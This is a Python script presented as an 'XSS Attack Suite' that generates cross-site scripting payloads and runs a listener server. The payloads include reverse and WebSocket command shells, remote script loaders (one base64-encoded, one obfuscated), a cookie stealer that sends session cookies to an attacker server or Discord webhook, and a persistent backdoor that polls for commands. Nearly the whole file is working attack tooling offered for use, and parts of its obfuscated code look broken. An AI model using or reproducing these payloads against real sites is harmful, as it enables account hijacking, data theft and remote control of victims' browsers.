#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import base64
import socket
import threading
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs
from http.server import HTTPServer, BaseHTTPRequestHandler

class XSSAttackSuite:
    def __init__(self):
        self.config = {
            'attacker_ip': '127.0.0.1',
            'reverse_shell_port': 4444,
            'web_server_port': 8080,
            'websocket_port': 8081,
            'discord_webhook': None,
            'payloads_enabled': {
                'reverse_shell': True,
                'websocket_shell': True,
                'fetch_shell': True,
                'download_exec': True,
                'cookie_stealer': True,
                'persistent_backdoor': True
            }
        }
        
        self.payloads = {}
        self.generate_payloads()
    
    def generate_payloads(self):
        """Gera todos os payloads XSS com as configurações atuais"""
        ip = self.config['attacker_ip']
        rs_port = self.config['reverse_shell_port']
        ws_port = self.config['websocket_port']
        web_port = self.config['web_server_port']
        
        # 1. JavaScript para Shell Reverso (Node.js)
        self.payloads['node_reverse_shell'] = f"""
<script>
var net = require('net');
var sh = require('child_process').exec('/bin/bash');
var client = new net.Socket();
client.connect({rs_port}, "{ip}", function(){{
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
}});
</script>
"""

        # 2. WebSocket + Shell Reverso
        self.payloads['websocket_shell'] = f"""
<script>
var ws = new WebSocket('ws://{ip}:{ws_port}/shell');
ws.onmessage = function(event) {{
    var cmd = event.data;
    try {{
        var result = eval(cmd);
        ws.send(String(result));
    }} catch (e) {{
        ws.send('Error: ' + e.message);
    }}
}};
ws.onopen = function() {{
    ws.send('XSS WebSocket Shell Connected');
}};
</script>
"""

        # 3. Fetch API para Reverse Shell
        self.payloads['fetch_shell'] = f"""
<script>
setInterval(function() {{
    fetch('http://{ip}:{web_port}/getcmd')
    .then(response => response.text())
    .then(cmd => {{
        if(cmd !== 'wait') {{
            try {{
                var result = eval(cmd);
                fetch('http://{ip}:{web_port}/result', {{
                    method: 'POST',
                    body: String(result)
                }});
            }} catch (e) {{
                fetch('http://{ip}:{web_port}/result', {{
                    method: 'POST',
                    body: 'Error: ' + e.message
                }});
            }}
        }}
    }});
}}, 5000);
</script>
"""

        # 4. XSS para Download e Execução
        self.payloads['download_exec'] = f"""
<script>
var script = document.createElement('script');
script.src = 'http://{ip}:{web_port}/malware.js';
document.head.appendChild(script);
</script>
"""

        # 5. Payload Compacto para Reverse Shell (Base64 encoded)
        compact_payload = f"""
var s = document.createElement('script');
s.src = 'http://{ip}:{web_port}/shell.js';
document.head.appendChild(s);
"""
        compact_b64 = base64.b64encode(compact_payload.encode()).decode()
        self.payloads['compact_reverse_shell'] = f"""
<img src=x onerror="eval(atob('{compact_b64}'))">
"""

        # 6. XSS para RCE via Image
        self.payloads['image_rce'] = f"""
<img src=x onerror="fetch('http://{ip}:{web_port}/rce?cmd='+btoa('whoami')).then(r=>r.text()).then(d=>alert(d))">
"""

        # 7. Cookie Stealer + Shell
        discord_webhook = self.config['discord_webhook'] or f'http://{ip}:{web_port}/steal'
        self.payloads['cookie_stealer'] = f"""
<script>
// Rouba cookies e envia para attacker
fetch('{discord_webhook}?cookie=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(window.location.href));
// Depois executa shell reverso
var s=document.createElement('script');s.src='http://{ip}:{web_port}/shell.js';document.head.appendChild(s);
</script>
"""

        # 13. XSS Persistent com Backdoor
        self.payloads['persistent_backdoor'] = f"""
<script>
if (!localStorage.getItem('xss_backdoor_installed')) {{
    localStorage.setItem('xss_backdoor_installed', 'true');
    setInterval(function() {{
        fetch('http://{ip}:{web_port}/poll')
        .then(r => r.text())
        .then(cmd => {{
            if (cmd !== 'wait') {{
                try {{
                    eval(cmd);
                }} catch (e) {{
                    console.error('XSS Backdoor Error:', e);
                }}
            }}
        }});
    }}, 10000);
}}
</script>
"""

        # 15. Payload Ofuscado
        obfuscated_payload = f"""
var s=document.createElement('script');
s.src='http://{ip}:{web_port}/obfuscated.js';
document.head.appendChild(s);
"""
        self.payloads['obfuscated'] = f"""
<script>
var _0x1a2b=['cmV2ZXJzZS1zaGVsbA==','aHR0cDovL3tpcHs6cG9ydH0v','c3Jj','Y3JlYXRlRWxlbWVudA==','c2NyaXB0','YXBwZW5kQ2hpbGQ=','aGVhZA=='].map(function(x) {{ return atob(x).replace('{{ip}}', '{ip}').replace('{{port}}', '{web_port}'); }});
(function(_0x1a2b3a,_0x1a2b3b){{var _0x1a2b3c=function(_0x1a2b3d){{while(--_0x1a2b3d){{_0x1a2b3a['push'](_0x1a2b3a['shift']());}}}};_0x1a2b3c(++_0x1a2b3b);}}(_0x1a2b,0x104));
var _0x1a2b3=function(_0x1a2b3a,_0x1a2b3b){{_0x1a2b3a=_0x1a2b3a-0x0;var _0x1a2b3c=_0x1a2b[_0x1a2b3a];return _0x1a2b3c;}};
var s=document[_0x1a2b3('0x4')](_0x1a2b3('0x4'));
s[_0x1a2b3('0x2')]=_0x1a2b3('0x1')+_0x1a2b3('0x0')+'.js';
document[_0x1a2b3('0x6')][_0x1a2b3('0x5')](s);
</script>
"""

    def show_banner(self):
        """Exibe banner estilizado"""
        banner = """
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█░▄▄▀█▀▄▄▀█▀▄▄▀█░▄▄▀█░▄▄█▀▄▄▀█▄░▄██▄██░▄▄▀█▀▄▄▀█░▄▄█▄░▄█▄░▄██▄██░████░▄▄▀
█░▀▀░█░▀▀░█░▀▀░█░▀▀▄█░▄▄█░██░██░███░██░▀▀░█░██░█░▄▄██░████░███░██░▀▀░█░▀▀▄
█░██░█░████░████▄█▄▄█▄▄▄█▄▄███▄▄███▄██▄██░█▄▄███▄▄▄██▄▄██▄▄███▄██▄██░▄█▄▄
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
                        XSS Attack Suite v2.0
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
"""
        print(banner)
        print(f"[+] Attacker IP: {self.config['attacker_ip']}")
        print(f"[+] Reverse Shell Port: {self.config['reverse_shell_port']}")
        print(f"[+] Web Server Port: {self.config['web_server_port']}")
        print(f"[+] WebSocket Port: {self.config['websocket_port']}")
        if self.config['discord_webhook']:
            print(f"[+] Discord Webhook: {self.config['discord_webhook']}")
        print("▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n")

    def list_payloads(self):
        """Lista todos os payloads disponíveis"""
        print("\n[+] Available XSS Payloads:")
        print("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀")
        
        payloads_list = [
            ("1", "Node.js Reverse Shell", "node_reverse_shell"),
            ("2", "WebSocket Shell", "websocket_shell"),
            ("3", "Fetch API Shell", "fetch_shell"),
            ("4", "Download & Execute", "download_exec"),
            ("5", "Compact Reverse Shell", "compact_reverse_shell"),
            ("6", "Image RCE", "image_rce"),
            ("7", "Cookie Stealer + Shell", "cookie_stealer"),
            ("8", "Persistent Backdoor", "persistent_backdoor"),
            ("9", "Obfuscated Payload", "obfuscated")
        ]
        
        for num, name, key in payloads_list:
            status = "✓" if self.config['payloads_enabled'].get(key, True) else "✗"
            print(f" [{num}] {status} {name}")

    def configure(self):
        """Permite ao usuário configurar as opções"""
        print("\n[+] Configuration:")
        print("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀")
        
        self.config['attacker_ip'] = input(f"Attacker IP [{self.config['attacker_ip']}]: ") or self.config['attacker_ip']
        self.config['reverse_shell_port'] = int(input(f"Reverse Shell Port [{self.config['reverse_shell_port']}]: ") or self.config['reverse_shell_port'])
        self.config['web_server_port'] = int(input(f"Web Server Port [{self.config['web_server_port']}]: ") or self.config['web_server_port'])
        self.config['websocket_port'] = int(input(f"WebSocket Port [{self.config['websocket_port']}]: ") or self.config['websocket_port'])
        
        webhook = input("Discord Webhook URL [Enter to skip]: ")
        if webhook:
            self.config['discord_webhook'] = webhook
        
        # Atualizar payloads com nova configuração
        self.generate_payloads()
        
        print("\n[+] Enable/Disable Payloads:")
        for key in self.config['payloads_enabled']:
            current = self.config['payloads_enabled'][key]
            toggle = input(f"Enable {key}? (y/n) [{ 'y' if current else 'n' }]: ").lower()
            if toggle in ['y', 'yes']:
                self.config['payloads_enabled'][key] = True
            elif toggle in ['n', 'no']:
                self.config['payloads_enabled'][key] = False

    def start_web_server(self):
        """Inicia servidor web para receber conexões"""
        class XSSHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<h1>XSS Attack Server Ready</h1>')
                
                elif self.path == '/malware.js':
                    self.send_response(200)
                    self.send_header('Content-type', 'application/javascript')
                    self.end_headers()
                    self.wfile.write(b'alert("XSS Payload Executed!");')
                
                elif self.path.startswith('/steal'):
                    query = urlparse(self.path).query
                    params = parse_qs(query)
                    if 'cookie' in params:
                        cookie = params['cookie'][0]
                        url = params.get('url', [''])[0]
                        print(f"\n[!] COOKIE STOLEN: {cookie}")
                        print(f"[!] FROM URL: {url}")
                        
                        # Se tiver webhook do Discord, enviar
                        if suite.config['discord_webhook']:
                            import requests
                            try:
                                data = {
                                    "content": f"🍪 **Cookie Stolen**\nURL: {url}\nCookie: `{cookie}`"
                                }
                                requests.post(suite.config['discord_webhook'], json=data)
                            except:
                                pass
                    
                    self.send_response(200)
                    self.end_headers()
                
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def log_message(self, format, *args):
                return  # Silenciar logs

        print(f"\n[+] Starting XSS Web Server on port {self.config['web_server_port']}...")
        with socketserver.TCPServer(("", self.config['web_server_port']), XSSHandler) as httpd:
            print(f"[+] Web server running at http://{self.config['attacker_ip']}:{self.config['web_server_port']}")
            print("[+] Press Ctrl+C to stop server")
            
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\n[!] Server stopped")

    def generate_payload_file(self, payload_key):
        """Gera arquivo com payload específico"""
        if payload_key in self.payloads:
            filename = f"xss_payload_{payload_key}.html"
            with open(filename, 'w') as f:
                f.write(self.payloads[payload_key])
            print(f"[+] Payload saved to {filename}")
            return filename
        else:
            print(f"[!] Payload {payload_key} not found")
            return None

    def run(self):
        """Executa a suite principal"""
        self.show_banner()
        
        while True:
            print("\n[+] Main Menu:")
            print("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀")
            print(" [1] List Available Payloads")
            print(" [2] Configure Settings")
            print(" [3] Generate Specific Payload")
            print(" [4] Start Web Server")
            print(" [5] Generate All Payloads")
            print(" [0] Exit")
            
            choice = input("\nSelect option: ").strip()
            
            if choice == "1":
                self.list_payloads()
            
            elif choice == "2":
                self.configure()
            
            elif choice == "3":
                self.list_payloads()
                payload_num = input("\nSelect payload number: ").strip()
                
                payload_map = {
                    "1": "node_reverse_shell",
                    "2": "websocket_shell",
                    "3": "fetch_shell",
                    "4": "download_exec",
                    "5": "compact_reverse_shell",
                    "6": "image_rce",
                    "7": "cookie_stealer",
                    "8": "persistent_backdoor",
                    "9": "obfuscated"
                }
                
                if payload_num in payload_map:
                    payload_key = payload_map[payload_num]
                    if self.config['payloads_enabled'].get(payload_key, True):
                        filename = self.generate_payload_file(payload_key)
                        if filename:
                            print(f"\n[+] Payload content:\n")
                            print("═" * 50)
                            print(self.payloads[payload_key])
                            print("═" * 50)
                    else:
                        print(f"[!] Payload {payload_key} is disabled")
                else:
                    print("[!] Invalid payload number")
            
            elif choice == "4":
                self.start_web_server()
            
            elif choice == "5":
                print("\n[+] Generating all enabled payloads...")
                for key in self.payloads:
                    if self.config['payloads_enabled'].get(key, True):
                        self.generate_payload_file(key)
                print("[+] All payloads generated!")
            
            elif choice == "0":
                print("[+] Exiting...")
                break
            
            else:
                print("[!] Invalid option")

if __name__ == "__main__":
    suite = XSSAttackSuite()
    suite.run()
